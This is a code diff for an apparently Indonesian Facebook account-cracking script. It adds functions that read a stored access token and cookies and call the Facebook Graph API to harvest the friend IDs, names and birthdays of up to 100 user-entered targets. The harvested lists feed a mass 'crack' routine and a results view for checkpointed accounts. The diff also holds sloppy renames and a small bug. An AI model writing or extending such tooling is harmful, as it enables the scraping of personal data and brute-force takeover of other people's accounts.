@@ -270,7 +270,7 @@ def menu():
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
-	        dump_asep()
+	        dump_massal()
 	elif CYXIEON_GANTENG in ['03','3']:
 	        hasil_cp()
 	elif CYXIEON_GANTENG in ['04','4']:
@@ -279,7 +279,7 @@ def menu():
             ganti_cokies()
 
 #----------[ CRACK-MASSAL ]----------#    
-def dump_massal():
+def dumpp_massal():
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
@@ -389,8 +389,112 @@ def dump_asep():
         exit()
     except (KeyError, IOError):
         exit()
+#-----------------[ DUMP PUBLIK ]-----------------#
+def dump(idt, fields, cookie, token):
+    try:
+        headers = {
+            "connection": "keep-alive",
+            "accept": "*/*",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-user": "?1",
+            "sec-ch-ua-mobile": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+            "accept-encoding": "gzip, deflate",
+            "accept-language": "id-ID,id;q=0.9",
+        }
+        if len(id) == 0:
+            params = {
+                "access_token": token,
+                "fields": f"name,friends.fields(id,name,birthday)",
+            }
+        else:
+            params = {
+                "access_token": token,
+                "fields": f"name,friends.fields(id,name,birthday).after({fields})",
+            }
+        url = ses.get(
+            f"https://graph.facebook.com/{idt}",
+            params=params,
+            headers=headers,
+            cookies=cookie,
+        ).json()
+        for i in url["friends"]["data"]:
+            # print(i["id"]+"|"+i["name"])
+            id.append(i["id"] + "|" + i["name"])
+            sys.stdout.write(f"\r sedang dump... {len(id)}"),
+            sys.stdout.flush()
+        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
+    except:
+        pass
+#-------------------[ CRACK-PUBLIK ]----------------#
+def dump_massal():
+	try:
+		token = open('.tok.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input(f'[{h}•{x}] Masukkan Jumlah Target : '))
+	except ValueError:
+		print('└─ wrong input ')
+		exit()
+	if jum<1 or jum>100:
+		print('└─ Failed Dump Id maybe id is not public ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(f'[{h}+{x}] Target '+str(yz)+' : ')
+		uid.append(kl)
+	nazri_ganteng('=' * 0)
+	for userr in uid:
+		try:
+			headers = {
+			"connection": "keep-alive",
+			"accept": "*/*",
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"sec-fetch-user": "?1",
+			"sec-ch-ua-mobile": "?1",
+			"upgrade-insecure-requests": "1",
+			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9"
+			}
+			params = {
+			"access_token": token,
+			"fields": f"name,friends.fields(id,name,birthday)"
+			}
+			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], params = params, headers = headers, cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print('└─ unstable signal ')
+			exit()
+	try:
+		print(f'🌏 Target Terkumpul : '+str(len(id)))
+		atur_id()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('└─ unstable signal ')
+		back()
+	except (KeyError,IOError):
+		print(f'└─{k} Friendship Not Public {x}')
+		time.sleep(3)
+		back()
 #----------[ CRACK-PUBLIK  ]----------#            
-def dump(idt,fields,cookie,token):
+def dumpp(idt,fields,cookie,token):
 	try:
 		headers = {
 			"connection": "keep-alive", 
